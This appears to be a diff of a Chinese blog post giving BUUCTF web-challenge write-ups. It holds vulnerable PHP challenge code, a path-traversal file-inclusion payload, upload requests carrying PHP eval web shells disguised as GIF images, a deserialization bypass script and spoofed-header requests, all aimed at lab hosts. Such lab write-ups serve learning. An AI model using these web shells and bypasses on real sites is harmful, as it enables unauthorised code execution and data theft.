@@ -10,7 +10,7 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="buu第一页">
 <meta property="og:url" content="http://example.com/2025/04/04/buu%E7%AC%AC%E4%B8%80%E9%A1%B5/index.html">
-<meta property="og:site_name" content="jujub3">
+<meta property="og:site_name" content="juju">
 <meta property="og:description" content="z之前写的，把它放在博客上吧">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1729570752160-3c1b8358-683b-45ca-9d40-d57c020be211.png">
@@ -104,7 +104,7 @@
 <meta property="og:image" content="http://example.com/buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733905198815-88dbee96-527d-4434-93e7-c81e858cc81e.png">
 <meta property="article:published_time" content="2025-04-04T09:16:03.000Z">
 <meta property="article:modified_time" content="2025-04-04T09:21:55.605Z">
-<meta property="article:author" content="jujub3">
+<meta property="article:author" content="juju">
 <meta property="article:tag" content="buu">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1729570752160-3c1b8358-683b-45ca-9d40-d57c020be211.png">
@@ -225,7 +225,7 @@
 
     <div class="meta">
       <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span class="p-name" itemprop="name">jujub3</span>
+        <span class="p-name" itemprop="name">juju</span>
       </span>
       
     <div class="postdate">
@@ -261,63 +261,8 @@
 <h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1729570898971-7af6eebe-7562-4132-bc89-0e92d378dfce.png" alt="img">查看源码，发现，在源码里插入了一段php代码，如果cat&#x3D;dog，就会输出一个东西，所以就试一试，最后flag直接就出来了</p>
 <p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1729571004490-273cf837-0ea7-4697-b01c-0a6e9125ca35.png" alt="img"></p>
 <h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>这题查看源码得到一个文件source.php，是一段代码</p>
-<pre><code class="language-plain"> &lt;?php
-    highlight_file(__FILE__);
-    class emmm
-    &#123;
-        public static function checkFile(&amp;$page)
-        &#123;
-            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];
-            if (! isset($page) || !is_string($page)) &#123;
-                echo &quot;you can&#39;t see it&quot;;
-                return false;
-            &#125;
-            //如果要返回true，$page需要有值，并且是字符串
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">            //如果要返回true，$page需要有值，并且是字符串</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            //如果要返回true，$page的值需要包含白名单hint.php或者source.php</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">            );</span><br><span class="line">            //mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)表示在$page的最后添加一个？，mb_strpos也就是返回第一个问号出现的位置</span><br><span class="line">            //这段代码表示：返回$page问号之前的部分的值给$_page</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            //检查$_page中是否含有白名单，如果有返回true</span><br><span class="line"></span><br><span class="line">          </span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            //这段代码就是进行解码，然后进行上一步操作</span><br><span class="line">            echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#x27;file&#x27;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
 
-            if (in_array($page, $whitelist)) &#123;
-                return true;
-            &#125;
-            //如果要返回true，$page的值需要包含白名单hint.php或者source.php
-
-            $_page = mb_substr(
-                $page,
-                0,
-                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
-            );
-            //mb_strpos($page . &#39;?&#39;, &#39;?&#39;)表示在$page的最后添加一个？，mb_strpos也就是返回第一个问号出现的位置
-            //这段代码表示：返回$page问号之前的部分的值给$_page
-            if (in_array($_page, $whitelist)) &#123;
-                return true;
-            &#125;
-            //检查$_page中是否含有白名单，如果有返回true
-
-          
-            $_page = urldecode($page);
-            $_page = mb_substr(
-                $_page,
-                0,
-                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
-            );
-            if (in_array($_page, $whitelist)) &#123;
-                return true;
-            &#125;
-            //这段代码就是进行解码，然后进行上一步操作
-            echo &quot;you can&#39;t see it&quot;;
-            return false;
-        &#125;
-    &#125;
-
-    if (! empty($_REQUEST[&#39;file&#39;])
-        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])
-        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])
-    ) &#123;
-        include $_REQUEST[&#39;file&#39;];
-        exit;
-    &#125; else &#123;
-        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
-    &#125;  
-?&gt; 
-</code></pre>
 <p>首先是一个类，类中有个函数checkFile，总体来看，要想拿到flag，传入的file就要在?之前的内容包含白名单，</p>
 <p>最后的payload：<br><a target="_blank" rel="noopener" href="http://a60c7759-77a0-4d5b-9f92-9cabe917d48b.node5.buuoj.cn:81/source.php?file=hint.php?../../../../../ffffllllaaaagggg">http://a60c7759-77a0-4d5b-9f92-9cabe917d48b.node5.buuoj.cn:81/source.php?file=hint.php?../../../../../ffffllllaaaagggg</a></p>
 <p>这里有个注意就是：在include文件包含的时候，会把hint.php?当成一个不存在的目录（如果一个目录不存在就会自动生成，与前面的source.php在同一级目录），最后再利用目录穿越，包含文件ffffllllaaaagggg</p>
@@ -406,18 +351,8 @@
 <p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733147727553-efa7025d-b379-4f3f-9a28-d791a2f27071.png" alt="img"></p>
 <p>最后通过抓包发现一个secr3t.php</p>
 <p>最后是一个代码审计</p>
-<pre><code class="language-plain">&lt;?php
-    highlight_file(__FILE__);
-    error_reporting(0);
-    $file=$_GET[&#39;file&#39;];
-    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;
-        echo &quot;Oh no!&quot;;
-        exit();
-    &#125;
-    include($file); 
-//flag放在了flag.php里
-?&gt;
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file=$_GET[&#x27;file&#x27;];</span><br><span class="line">    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">//flag放在了flag.php里</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
 <p>strstr($file,”..&#x2F;“)：用来检查$file中是否含有..&#x2F;，如果有返回true，否则false</p>
 <p>stristr($file, “tp”)：用来检查$file中是否含有 tp（忽略大小写），函数中的i表示忽略大小写，有返回true</p>
 <p>..&#x2F; ：file协议就被限制了</p>
@@ -428,18 +363,12 @@
 <p>最后拿去解码，直接出flag</p>
 <p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733148573125-00a42cb7-0dae-4a83-b695-e45f6be5671f.png" alt="img"></p>
 <h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>最后的数据包：</p>
-<pre><code class="language-plain">GET /Secret.php HTTP/1.1
-Host: node5.buuoj.cn:28819
-User-Agent: Syclover
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate, br
-Connection: keep-alive
-Upgrade-Insecure-Requests: 1
-X-Forwarded-For: localhost
-Referer: https://Sycsecret.buuoj.cn
-Priority: u=0, i
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /Secret.php HTTP/1.1</span><br><span class="line">Host: node5.buuoj.cn:28819</span><br><span class="line">User-Agent: Syclover</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">X-Forwarded-For: localhost</span><br><span class="line">Referer: https://Sycsecret.buuoj.cn</span><br><span class="line">Priority: u=0, i</span><br></pre></td></tr></table></figure>
+
+
+
+
+
 <h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>这题是一个文件上传，首先试一试php能不能上传（</p>
 <p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733149572070-ad6f4a2f-cc2e-4605-af0c-56d4679fa9eb.png" alt="img"></p>
 <p>改文件类型，然后加GIF89a</p>
@@ -450,32 +379,8 @@ Priority: u=0, i
 <script language="php">@eval($_POST['cmd'])</script>
 
 <p>最后上传成功，数据包：</p>
-<pre><code class="language-plain">POST /upload_file.php HTTP/1.1
-Host: 550da846-1251-439b-9d9c-e41d3a235eba.node5.buuoj.cn:81
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate, br
-Content-Type: multipart/form-data; boundary=---------------------------345885807924535443833968758605
-Content-Length: 396
-Origin: http://550da846-1251-439b-9d9c-e41d3a235eba.node5.buuoj.cn:81
-Connection: keep-alive
-Referer: http://550da846-1251-439b-9d9c-e41d3a235eba.node5.buuoj.cn:81/
-Upgrade-Insecure-Requests: 1
-Priority: u=0, i
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST /upload_file.php HTTP/1.1</span><br><span class="line">Host: 550da846-1251-439b-9d9c-e41d3a235eba.node5.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------345885807924535443833968758605</span><br><span class="line">Content-Length: 396</span><br><span class="line">Origin: http://550da846-1251-439b-9d9c-e41d3a235eba.node5.buuoj.cn:81</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://550da846-1251-439b-9d9c-e41d3a235eba.node5.buuoj.cn:81/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">-----------------------------345885807924535443833968758605</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.phtml&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;cmd&#x27;])&lt;/script&gt;</span><br><span class="line">-----------------------------345885807924535443833968758605</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">提交</span><br><span class="line">-----------------------------345885807924535443833968758605--</span><br></pre></td></tr></table></figure>
 
------------------------------345885807924535443833968758605
-Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.phtml&quot;
-Content-Type: image/png
-
-GIF89a
-&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#39;cmd&#39;])&lt;/script&gt;
------------------------------345885807924535443833968758605
-Content-Disposition: form-data; name=&quot;submit&quot;
-
-提交
------------------------------345885807924535443833968758605--
-</code></pre>
 <p>访问upload目录下的1.phtml（路径猜出来的）</p>
 <p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733149759306-9777b5c6-a95b-4ddd-99a5-42e62b11f24b.png" alt="img"></p>
 <h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>题目进去直接给一句话了</p>
@@ -483,34 +388,8 @@ Content-Disposition: form-data; name=&quot;submit&quot;
 <p>直接连上拿flag</p>
 <p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733149944136-b8a3830f-18a9-475c-88e5-641a457d0fb9.png" alt="img"></p>
 <h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>这题还是一样传一个phtml文件就行了，这里给出数据包</p>
-<pre><code class="language-plain">POST / HTTP/1.1
-Host: e36847a0-00ae-4f5c-89cf-0880343f3e29.node5.buuoj.cn:81
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate, br
-Content-Type: multipart/form-data; boundary=---------------------------342542114227482252831393085712
-Content-Length: 688
-Origin: http://e36847a0-00ae-4f5c-89cf-0880343f3e29.node5.buuoj.cn:81
-Connection: keep-alive
-Referer: http://e36847a0-00ae-4f5c-89cf-0880343f3e29.node5.buuoj.cn:81/
-Upgrade-Insecure-Requests: 1
-Priority: u=0, i
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: e36847a0-00ae-4f5c-89cf-0880343f3e29.node5.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------342542114227482252831393085712</span><br><span class="line">Content-Length: 688</span><br><span class="line">Origin: http://e36847a0-00ae-4f5c-89cf-0880343f3e29.node5.buuoj.cn:81</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://e36847a0-00ae-4f5c-89cf-0880343f3e29.node5.buuoj.cn:81/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">-----------------------------342542114227482252831393085712</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;1.phtml&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;?= eval($_POST[1]);?&gt;</span><br><span class="line">�PNG</span><br><span class="line"></span><br><span class="line">-----------------------------342542114227482252831393085712</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">upload</span><br><span class="line">-----------------------------342542114227482252831393085712--</span><br></pre></td></tr></table></figure>
 
------------------------------342542114227482252831393085712
-Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;1.phtml&quot;
-Content-Type: image/png
-
-GIF89a
-&lt;?= eval($_POST[1]);?&gt;
-�PNG
-
------------------------------342542114227482252831393085712
-Content-Disposition: form-data; name=&quot;submit&quot;
-
-upload
------------------------------342542114227482252831393085712--
-</code></pre>
 <p>最后执行命令成功</p>
 <p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733150356314-4604a199-cbd9-4593-96e0-901235f685c3.png" alt="img"></p>
 <h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>这题的话还是一样先判断它的闭合方式，结果为单引号闭合。</p>
@@ -539,36 +418,13 @@ upload
 <p>要echo flag需要将密码设置为100，然后还有一点就是绕过wakeup()魔术方法。</p>
 <p>wakeup()绕过：当序列化字符串中属性个数大于真实属性个数，就会导致反序列化异常，从而跳过__wakeup()</p>
 <p>最后的php脚本：</p>
-<pre><code class="language-plain">&lt;?php
-class Name
-&#123;
-    private $username = &#39;admin&#39;;
-    private $password = &#39;100&#39;;
-&#125;
-$a=new Name();
-echo urlencode(str_replace(&#39;2&#39;,&#39;3&#39;,serialize($a)));
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name</span><br><span class="line">&#123;</span><br><span class="line">    private $username = &#x27;admin&#x27;;</span><br><span class="line">    private $password = &#x27;100&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new Name();</span><br><span class="line">echo urlencode(str_replace(&#x27;2&#x27;,&#x27;3&#x27;,serialize($a)));</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733226164309-7f5a15ad-d335-4d74-be6b-52152d7509d2.png" alt="img"></p>
 <h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733227193763-c137cc79-38c0-4db5-959b-49ffa70aab40.png" alt="img"></p>
 <p>然后下载得到一个index.php.bak文件</p>
-<pre><code class="language-plain">&lt;?php
-include_once &quot;flag.php&quot;;
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;key&#x27;])) &#123;</span><br><span class="line">    $key = $_GET[&#x27;key&#x27;];</span><br><span class="line">    if(!is_numeric($key)) &#123;</span><br><span class="line">        exit(&quot;Just num!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;</span><br><span class="line">    if($key == $str) &#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo &quot;Try to find out source file!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-if(isset($_GET[&#39;key&#39;])) &#123;
-    $key = $_GET[&#39;key&#39;];
-    if(!is_numeric($key)) &#123;
-        exit(&quot;Just num!&quot;);
-    &#125;
-    $key = intval($key);
-    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;
-    if($key == $str) &#123;
-        echo $flag;
-    &#125;
-&#125;
-else &#123;
-    echo &quot;Try to find out source file!&quot;;
-&#125;
-</code></pre>
 <p>这里需要传入的key为数字，但是又与$str相等。这里就直接用弱比较绕过了，</p>
 <p>直接传入?key&#x3D;123</p>
 <p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733227492329-51523f01-2b33-4092-a3cc-795cbca3618e.png" alt="img"></p>
@@ -577,9 +433,10 @@ else &#123;
 <p>var_dump()：输出变量的值（数组，类都可以）</p>
 <p>glob()：查找匹配特定模式的文件路径，它支持使用通配符来查找文件。</p>
 <p>如：</p>
-<pre><code class="language-plain">$files = glob(&#39;/path/to/directory/*.txt&#39;);
-print_r($files);
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$files = glob(&#x27;/path/to/directory/*.txt&#x27;);</span><br><span class="line">print_r($files);</span><br></pre></td></tr></table></figure>
+
+
+
 <p>这题的话是一个计算机，但是查看源码后可以看到有一个路径。</p>
 <p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733235763015-18ed15a2-2798-4f7c-ae38-8a6fa6a91c55.png" alt="img"></p>
 <p>但是这题不能传入字母</p>
@@ -601,22 +458,8 @@ print_r($files);
 <h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>这题在pay.php中发现了要给源码。</p>
 <p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733236886323-d60dbf5f-f230-4536-9a94-acf4e0d09e68.png" alt="img"></p>
 <p>就这样吧。最后一个支付flag用科学计数法绕过就行了</p>
-<pre><code class="language-plain">POST /pay.php HTTP/1.1
-Host: c8393959-844c-46bb-ace9-53ee2f5cff3f.node5.buuoj.cn:81
-Accept-Encoding: gzip, deflate
-Upgrade-Insecure-Requests: 1
-Priority: u=0, i
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
-Content-Type: application/x-www-form-urlencoded
-Referer: http://c8393959-844c-46bb-ace9-53ee2f5cff3f.node5.buuoj.cn:81/
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Origin: http://c8393959-844c-46bb-ace9-53ee2f5cff3f.node5.buuoj.cn:81
-Cookie: user=1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
-Content-Length: 14
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /pay.php HTTP/1.1</span><br><span class="line">Host: c8393959-844c-46bb-ace9-53ee2f5cff3f.node5.buuoj.cn:81</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Referer: http://c8393959-844c-46bb-ace9-53ee2f5cff3f.node5.buuoj.cn:81/</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Origin: http://c8393959-844c-46bb-ace9-53ee2f5cff3f.node5.buuoj.cn:81</span><br><span class="line">Cookie: user=1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0</span><br><span 